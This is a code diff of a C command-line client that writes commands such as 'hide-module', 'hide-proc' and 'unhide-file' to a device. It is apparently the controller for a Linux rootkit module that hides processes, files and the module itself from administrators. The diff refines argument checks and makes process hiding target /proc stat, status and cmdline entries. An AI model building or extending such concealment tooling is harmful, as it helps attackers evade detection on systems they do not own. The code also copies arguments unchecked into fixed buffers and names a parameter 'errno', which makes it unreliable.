@@ -18,15 +18,24 @@ const char* command_list[CMD_CNT] = {
 	"unhide-file"
 };
 
-const char* temp_list[3] = {
+const char* dir_list[3] = {
 	"/stat",
 	"/status",
 	"/cmdline"
 };
 
 void print_err(int errno) {
-	printf("Wrong command line argument!\n");
-	return;
+	switch(errno) {
+		case INVAL_CMD:
+			printf("Invalid command!\n");
+			exit(-1);
+		case INVAL_ARG:
+			printf("invalid argument!\n");
+			exit(-1);
+		case DEV_OPEN_FAIL:
+			printf("Device open fail!\n");
+			exit(-1);
+	}
 }
 
 int main(int argc, char* argv[]) {
@@ -34,22 +43,22 @@ int main(int argc, char* argv[]) {
 	char message[MAX_ARG_LEN] = {0};
 	char temp[MAX_ARG_LEN] = {0};
 
-	for (i = 0; i < CMD_CNT; i++) {
-		if (strcmp(command_list[i], argv[1]) == 0) {
-			error = 0;
-		}
-	}
-
-	if (error) {
-		print_err(INVAL_CMD);
-		return -1;
-	}
-
 	if (argc != 3) {
-		if (strcmp(argv[1], "hide-module") == 0 || strcmp(argv[1], "unhide-module") == 0)
+		if ((argc == 2) && (strcmp(argv[1], "hide-module") == 0 || strcmp(argv[1], "unhide-module") == 0))
 			;
 		else {
 			print_err(INVAL_ARG);
+			return -1;
+		}
+	} else {
+		for (i=0; i < CMD_CNT; i++) {
+			if (strcmp(command_list[i], argv[1]) == 0) {
+				error = 0;
+			}
+		}
+
+		if (error) {
+			print_err(INVAL_CMD);
 			return -1;
 		}
 	}
@@ -64,30 +73,20 @@ int main(int argc, char* argv[]) {
 	strcpy(message, argv[1]);
 	strcat(message, " ");
 
-	/*
-	if (argc == 3) {
-		if (strcmp(argv[1], "hide-proc") == 0 || strcmp(argv[1], "unhide-proc") == 0)
-			strcat(message, "/proc/");
-		strcat(message, argv[2]);
-	}
-
-	ret = write(fd, message, 128);
-	if (ret < 0)
-	{
-		printf("device write[1] failure!\n");
-		return -1;
-	}
-	*/
-
-	if (strcmp(argv[1], "hide-proc") == 0 || strcmp(argv[1], "unhide-proc") == 0) {
+	if (strcmp(argv[1], "hide-proc") == 0) {
 		strcat(message, "/proc/");
 		strcat(message, argv[2]);
 
 		for (i = 0; i < 3; i++) {
 			strcpy(temp, message);
-			strcat(temp, temp_list[i]);
+			strcat(temp, dir_list[i]);
 			write(fd, temp, MAX_ARG_LEN);
 		}
+	} else {
+		if (argc == 3)
+			strcat(message, argv[2]);
+		
+		write(fd, message, MAX_ARG_LEN);
 	}
 
 	return 0;
